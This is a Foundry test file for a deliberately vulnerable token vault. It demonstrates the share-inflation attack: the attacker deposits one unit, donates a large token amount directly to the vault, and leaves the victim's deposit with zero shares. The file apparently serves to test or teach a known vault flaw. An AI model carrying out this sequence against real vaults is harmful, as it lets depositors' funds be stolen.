// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

import "../contracts/MockERC20.sol";
import "../contracts/VulnerableVault.sol";

contract VaultTest is Test {
    MockERC20 token;
    VulnerableVault vault;

    address attacker = address(0x1);
    address victim = address(0x2);

    function setUp() public {
        token = new MockERC20();

        vault =
            new VulnerableVault(
                address(token)
            );

        token.mint(attacker, 1e24);
        token.mint(victim, 1e24);
    }

    function testInflationAttack()
        public
    {
        vm.startPrank(attacker);

        token.approve(
            address(vault),
            1
        );

        vault.deposit(1);

        token.transfer(
            address(vault),
            1e18
        );

        vm.stopPrank();

        vm.startPrank(victim);

        token.approve(
            address(vault),
            1
        );

        uint256 shares =
            vault.deposit(1);

        assertEq(shares, 0);

        vm.stopPrank();
    }
}